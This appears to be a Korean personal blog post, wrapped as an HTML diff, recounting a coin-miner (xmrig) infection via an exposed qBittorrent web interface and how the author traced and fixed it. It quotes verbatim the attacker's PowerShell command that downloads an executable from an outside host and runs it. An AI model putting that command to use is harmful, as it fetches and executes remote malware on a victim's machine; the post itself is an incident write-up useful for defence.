@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ko-kr"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="어느날 오후 윈도우 디펜더가 Trojan:Win64/CoinMiner.NB!MTB 격리 알림을 띄웠다. 게임 폴더를 제외하고 쓴 적은 있지만 코인마이너는 처음인데? 파일을 찾아가보니
+E:\torrent.exe
+원본 파일 이름 xmrig.exe
+정말 알기 쉬운 위치에 격리해도 지워도 또 생긴다. 윈도우 디펜더가 완벽하게 틀어막는 것도 아니라서 프로세스에 두개씩 세개씩 올라와있기도 하고. 크롬이 왜 갑자기 느린가 했어&hellip;.
+torrent? 큐빗부터 의심했지만 5.1.4 2026-01-23 설치라 업데이트 오염도 아닌 것 같고 너무 오랜만의 일에 당황하며 디펜더 검사와 삭제만 반복하다 뒤늦게 속성에서 원본 파일 이름을 보고 프로세스 단위로 확인해보니">  
+
+  <title>
+    
+      큐빗토렌트 코인마이너 감염
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.de67f9cd0aacf98648d0c0d4796ad0cd856635e2a60036ee14189fcbcc2b1a4c7d6d5e94e7d859565e0f840a9674885e8e841a2c0a8e5dd44c055b640ebaaf1c.css" integrity="sha512-3mf5zQqs&#43;YZI0MDUeWrQzYVmNeKmADbuFBify8wrGkx9bV6U59hZVl4PhAqWdIhejoQaLAqOXdRMBVtkDrqvHA==" />
+  
+</head>
+<body a="auto">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+                <div class="post-meta">
+                    <a href="/">..</a>
+
+                    <p>
+                        <time datetime="2026-03-13 22:02:00 &#43;0900 KST">
+                            2026-03-13
+                        </time>
+                    </p>
+                </div>
+
+<article>
+    <h1>큐빗토렌트 코인마이너 감염</h1>
+
+    
+
+    <p>어느날 오후 윈도우 디펜더가 Trojan:Win64/CoinMiner.NB!MTB 격리 알림을 띄웠다. 게임 폴더를 제외하고 쓴 적은 있지만 코인마이너는 처음인데? 파일을 찾아가보니</p>
+<pre tabindex="0"><code>E:\torrent.exe
+원본 파일 이름 xmrig.exe
+</code></pre><p>정말 알기 쉬운 위치에 격리해도 지워도 또 생긴다. 윈도우 디펜더가 완벽하게 틀어막는 것도 아니라서 프로세스에 두개씩 세개씩 올라와있기도 하고. 크롬이 왜 갑자기 느린가 했어&hellip;.</p>
+<p>torrent? 큐빗부터 의심했지만 5.1.4 2026-01-23 설치라 업데이트 오염도 아닌 것 같고 너무 오랜만의 일에 당황하며 디펜더 검사와 삭제만 반복하다 뒤늦게 속성에서 원본 파일 이름을 보고 프로세스 단위로 확인해보니</p>
+<pre tabindex="0"><code>qbittorrent.exe	1.71	1,049,996 K	557,724 K	15952	qBittorrent - A Bittorrent Client	The qBittorrent Project	C:\Program Files\qBittorrent\qbittorrent.exe
+powershell.exe		61,304 K	16,228 K	16592	Windows PowerShell	Microsoft Corporation	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+conhost.exe		1,268 K	3,144 K	21148	콘솔 창 호스트	Microsoft Corporation	C:\Windows\System32\conhost.exe
+torrent.exe	17.39	2,475,200 K	2,158,160 K	2088			E:\torrent.exe
+</code></pre><p>큐빗 - 파워쉘 - 콘솔 - 코인마이너가 돌아가고 있다. xmrig까지 찾아보니 확정.</p>
+<p><a href="https://www.reddit.com/r/qBittorrent/comments/11utohe/c3pool_miner/?tl=ko">https://www.reddit.com/r/qBittorrent/comments/11utohe/c3pool_miner/?tl=ko</a></p>
+<p>옵션-다운로드-외부 프로그램 실행-&lsquo;토렌트에서 실행이 추가되었습니다&rsquo;, &lsquo;토렌트에서 실행 완료&rsquo; 이 두 항목에</p>
+<pre tabindex="0"><code>powershell -Command &#34;$wc = New-Object System.Net.WebClient; $wc.DownloadFile(&#39;http://yify.foo/qbt&#39;, &#39;%D.exe&#39;); %D.exe&#34;
+</code></pre><p>들어가 있었어. 그러니 일정시간 지날때마다 파일 받으면서 다시 생겼지.</p>
+<p>계정비번 바꾸고 접속허용 IP 목록&hellip;.이 아니네 허용목록 인증우회였어 여튼 나름 보안 챙긴다고 챙겼지만 애초에 외부에 오픈한게 문제였다. 그럼 왜 caddy로 열어야 했던가? 내부망 다른 기기에서 큐빗 웹 접근이 안 되어서였잖아?</p>
+<p>그제서야 WireSock 설정을 둘러볼 생각이 들었다. DisallowedIPs = 192.168.0.0/24 또는 네트워크 설정에서 바이패스 랜 트래픽 활성화로 해결. 덕분에 외부 서비스 다 닫고 caddy도 걷어냈다. 또 하나 크게 부딪히면서 배웠네.</p>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
